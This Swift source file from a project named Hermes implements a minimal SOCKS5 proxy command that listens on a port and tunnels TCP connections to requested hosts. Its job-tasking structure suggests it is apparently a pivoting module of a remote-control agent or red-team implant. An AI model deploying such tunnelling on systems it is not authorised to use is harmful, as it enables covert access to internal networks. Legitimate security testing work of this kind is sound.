//
//  socks_proxy.swift
//  Hermes
//
//  Created by Matthew Trautman on 04/17/25.
//

import Foundation
import Network

class SocksProxy {
    let listenerPort: NWEndpoint.Port
    var listener: NWListener?

    init(port: UInt16) {
        self.listenerPort = NWEndpoint.Port(rawValue: port) ?? 1080
    }

    func start(job: Job) {
        do {
            listener = try NWListener(using: .tcp, on: listenerPort)
        } catch {
            job.result = "[-] Failed to start SOCKS proxy on port \(listenerPort): \(error)"
            job.completed = true
            job.success = false
            return
        }

        listener?.newConnectionHandler = { [weak self] connection in
            connection.start(queue: .global())
            self?.handleConnection(connection, job: job)
        }

        listener?.start(queue: .global())
        job.result = "[+] SOCKS proxy started on port \(listenerPort)"
        job.completed = true
        job.success = true
    }

    private func handleConnection(_ connection: NWConnection, job: Job) {
        connection.receive(minimumIncompleteLength: 2, maximumLength: 262) { (data, _, _, error) in
            guard let data = data, error == nil else {
                print("[-] Failed to receive SOCKS greeting")
                return
            }

            guard data.first == 0x05 else {
                print("[-] Unsupported SOCKS version")
                return
            }

            let response = Data([0x05, 0x00])
            connection.send(content: response, completion: .contentProcessed({ sendError in
                if sendError != nil {
                    print("[-] Failed to send SOCKS handshake response")
                    return
                }

                self.receiveRequest(on: connection)
            }))
        }
    }

    private func receiveRequest(on connection: NWConnection) {
        connection.receive(minimumIncompleteLength: 4, maximumLength: 1024) { (data, _, _, error) in
            guard let data = data, error == nil else {
                print("[-] Failed to receive SOCKS request")
                return
            }

            guard data.count > 7 else {
                print("[-] Incomplete SOCKS request")
                return
            }

            let addressType = data[3]
            var address = ""
            var portIndex = 4

            switch addressType {
            case 0x01:
                address = (4..<8).map { String(data[$0]) }.joined(separator: ".")
                portIndex = 8
            case 0x03:
                let domainLength = Int(data[4])
                if data.count < 5 + domainLength + 2 { return }
                let domainData = data[5..<5+domainLength]
                address = String(data: domainData, encoding: .utf8) ?? ""
                portIndex = 5 + domainLength
            default:
                print("[-] Unsupported address type")
                return
            }

            let port = Int(data[portIndex]) << 8 | Int(data[portIndex + 1])
            print("[+] SOCKS request: CONNECT to \(address):\(port)")

            self.establishTunnel(to: address, port: port, clientConnection: connection)
        }
    }

    private func establishTunnel(to host: String, port: Int, clientConnection: NWConnection) {
        let remoteHost = NWEndpoint.Host(host)
        let remotePort = NWEndpoint.Port(rawValue: UInt16(port)) ?? .http

        let targetConnection = NWConnection(host: remoteHost, port: remotePort, using: .tcp)
        targetConnection.stateUpdateHandler = { state in
            switch state {
            case .ready:
                let reply = Data([0x05, 0x00, 0x00, 0x01] + [0, 0, 0, 0] + [0x00, 0x00])
                clientConnection.send(content: reply, completion: .contentProcessed({ _ in
                    self.pipeData(between: clientConnection, and: targetConnection)
                }))
            case .failed(let error):
                print("[-] Failed to connect to target: \(error)")
                clientConnection.cancel()
                targetConnection.cancel()
            default: break
            }
        }

        targetConnection.start(queue: .global())
    }

    private func pipeData(between client: NWConnection, and remote: NWConnection) {
        func forward(from: NWConnection, to: NWConnection) {
            from.receive(minimumIncompleteLength: 1, maximumLength: 4096) { data, _, _, error in
                if let data = data {
                    to.send(content: data, completion: .contentProcessed({ _ in }))
                    forward(from: from, to: to)
                } else {
                    from.cancel()
                    to.cancel()
                }
            }
        }

        forward(from: client, to: remote)
        forward(from: remote, to: client)
    }
}

// Hermes command entry point
func socks_proxy(job: Job) {
    var port: UInt16 = 1080

    do {
        let jsonParameters = try JSON(data: toData(string: job.parameters))
        if let userPort = UInt16(jsonParameters["port"].stringValue) {
            port = userPort
        }
    } catch {
        job.result = "[-] Failed to parse parameters: \(error)"
        job.completed = true
        job.success = false
        return
    }

    let proxy = SocksProxy(port: port)
    proxy.start(job: job)
}
